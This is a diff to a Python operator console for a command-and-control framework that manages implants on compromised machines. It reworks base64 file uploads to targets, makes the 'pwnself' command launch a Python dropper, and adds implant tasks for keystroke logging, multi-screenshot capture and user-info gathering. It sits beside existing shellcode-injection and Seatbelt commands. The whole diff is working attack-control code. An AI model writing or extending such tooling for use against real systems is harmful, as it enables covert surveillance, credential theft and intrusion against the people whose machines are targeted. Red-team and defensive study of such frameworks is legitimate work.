@@ -1,6 +1,6 @@
 #!/usr/bin/python
  
-import os, time, readline, base64, re, traceback, glob, sys, argparse, shlex, signal
+import os, time, readline, base64, re, traceback, glob, sys, argparse, shlex, signal, subprocess
 import datetime
 from datetime import datetime, timedelta
 from sqlite3 import Error
@@ -107,6 +107,14 @@ def filecomplete(text, state):
   os.chdir(PayloadsDirectory)
   return (glob.glob(text+'*')+[None])[state]
 
+def readfile_with_completion(message):
+  readline.set_completer(filecomplete)
+  path = raw_input(message)
+  t = tabCompleter()
+  t.createListCompleter(COMMANDS)
+  readline.set_completer(t.listCompleter)
+  return path
+
 def complete(text, state):
   for cmd in COMMANDS:
     if cmd.startswith(text):
@@ -181,6 +189,7 @@ def startup(printhelp = ""):
         elif Pivot == "C#": Pivot = "C#"
         elif Pivot == "Proxy": Pivot = "P"
         elif Pivot == "Python": Pivot = "PY"
+        elif Pivot == "OSX": Pivot = "PY"        
         else: Pivot = "PS"
 
         from datetime import datetime, timedelta
@@ -330,7 +339,8 @@ def startup(printhelp = ""):
       startup("creds module not implemented yet")
 
     if (implant_id.lower() == "pwnself" ) or (implant_id.lower() == "p"):
-      startup("Cannot pwnself on Unix :)\r\n")
+      subprocess.Popen(["python", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
+      startup()
 
     if (implant_id.lower() == "tasks" ) or (implant_id.lower() == "tasks "):
       alltasks = ""
@@ -448,18 +458,28 @@ def runcommand(command, randomuri):
       source = ""
       destination = ""
       s = ""
-      args = argp(command)
+      if command.strip().lower() == "upload-file":
+        source = readfile_with_completion("Location of file to upload: ")
+        while not os.path.isfile(source):
+          print("File does not exist: %s" % source)
+          source = readfile_with_completion("Location of file to upload: ")
+        destination = raw_input("Location to upload to: ")
+      else:
+        args = argp(command)
+        source = args.source
+        destination = args.destination
       try:
-        if args:
-          with open(args.source, "rb") as source_file:
-            s = source_file.read()
-            source = base64.b64encode(s)
+        with open(source, "rb") as source_file:
+          s = source_file.read()
         if s:
-          destination = args.destination.replace("\\","\\\\")
+          sourceb64 = base64.b64encode(s)
+          destination = destination.replace("\\","\\\\")
           print ("")
-          print ("Uploading %s to %s" % (args.source, destination))
-          uploadcommand = "upload-file \"%s\":%s" % (destination, source)
+          print ("Uploading %s to %s" % (source, destination))
+          uploadcommand = "upload-file \"%s\":%s" % (destination, sourceb64)
           new_task(uploadcommand, randomuri)
+        else:
+          print("Source file could not be read or was empty")
       except Exception as e:
         print ("Error with source file: %s" % e   )
         traceback.print_exc()
@@ -521,25 +541,32 @@ def runcommand(command, randomuri):
         source = ""
         destination = ""
         s = ""
-        args = argp(command)
+        if command.strip().lower() == "upload-file":
+          source = readfile_with_completion("Location of file to upload: ")
+          while not os.path.isfile(source):
+            print("File does not exist: %s" % source)
+            source = readfile_with_completion("Location of file to upload: ")
+          destination = raw_input("Location to upload to: ")
+        else:
+          args = argp(command)
+          source = args.source
+          destination = args.destination
         try:
-          if args:
-            with open(args.source, "rb") as source_file:
-              s = source_file.read()
-              source = base64.b64encode(s)
+          with open(source, "rb") as source_file:
+            s = source_file.read()
           if s:
-            destination = args.destination.replace("\\","\\\\")
+            sourceb64 = base64.b64encode(s)
+            destination = destination.replace("\\","\\\\")
             print ("")
-            print ("Uploading %s to %s" % (args.source, destination))
-            if (args.nothidden):
-              uploadcommand = "upload-file%s;\"%s\"" % (source, destination)
-            else:
-              uploadcommand = "upload-file%s;\"%s\"" % (source, destination)
+            print ("Uploading %s to %s" % (source, destination))
+            uploadcommand = "upload-file%s;\"%s\"" % (sourceb64, destination)
             new_task(uploadcommand, randomuri)
+          else:
+            print("Source file could not be read or was empty")
         except Exception as e:
-          print ("Error with source file: %s" % e)
+          print ("Error with source file: %s" % e   )
           traceback.print_exc()
-              
+
       elif "unhide-implant" in command.lower():
         unhide_implant(randomuri)
 
@@ -549,11 +576,7 @@ def runcommand(command, randomuri):
       elif "inject-shellcode" in command.lower():
         params = re.compile("inject-shellcode", re.IGNORECASE)
         params = params.sub("", command)
-        readline.set_completer(filecomplete)
-        path = raw_input("Location of shellcode file: ")
-        t = tabCompleter()
-        t.createListCompleter(COMMANDS)
-        readline.set_completer(t.listCompleter)
+        path = readfile_with_completion("Location of shellcode file: ")
         try:
           shellcodefile = load_file(path)
           if shellcodefile != None:
@@ -580,6 +603,15 @@ def runcommand(command, randomuri):
         check_module_loaded("Seatbelt.exe", randomuri)
         new_task(command,randomuri)
 
+      elif (command.lower().startswith("stop-keystrokes")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+        
+      elif (command.lower().startswith("get-keystrokes")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+
+      elif (command.lower().startswith("get-screenshotmulti")):
+        new_task(command,randomuri)
+
       elif (command.lower().startswith("get-screenshot")):
         new_task("run-exe Core.Program Core %s" % command,randomuri)
         
@@ -593,6 +625,9 @@ def runcommand(command, randomuri):
         new_task("run-exe Core.Program Core %s" % command,randomuri)
 
       elif (command.lower().startswith("turtle")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+        
+      elif (command.lower().startswith("get-userinfo")):
         new_task("run-exe Core.Program Core %s" % command,randomuri)
                     
       elif (command.lower().startswith("get-content")):
@@ -969,23 +1004,35 @@ def runcommand(command, randomuri):
       source = ""
       destination = ""
       s = ""
-      args = argp(command)
+      nothidden = False
+      if command.strip().lower() == "upload-file":
+        source = readfile_with_completion("Location of file to upload: ")
+        while not os.path.isfile(source):
+          print("File does not exist: %s" % source)
+          source = readfile_with_completion("Location of file to upload: ")
+        destination = raw_input("Location to upload to: ")
+      else:
+        args = argp(command)
+        source = args.source
+        destination = args.destination
+        nothidden = args.nothidden
       try:
-        if args:
-          with open(args.source, "rb") as source_file:
-            s = source_file.read()
-            source = base64.b64encode(s)
+        with open(source, "rb") as source_file:
+          s = source_file.read()
         if s:
-          destination = args.destination.replace("\\","\\\\")
+          sourceb64 = base64.b64encode(s)
+          destination = destination.replace("\\","\\\\")
           print ("")
-          print ("Uploading %s to %s" % (args.source, destination))
-          if (args.nothidden):
-            uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, args.nothidden, source)
+          print ("Uploading %s to %s" % (source, destination))
+          if (nothidden):
+            uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
           else:
-            uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, source)
+            uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
           new_task(uploadcommand, randomuri)
+        else:
+          print("Source file could not be read or was empty")
       except Exception as e:
-        print ("Error with source file: %s" % e)
+        print ("Error with source file: %s" % e   )
         traceback.print_exc()
 
     elif "kill-implant" in command.lower() or "exit" in command.lower():
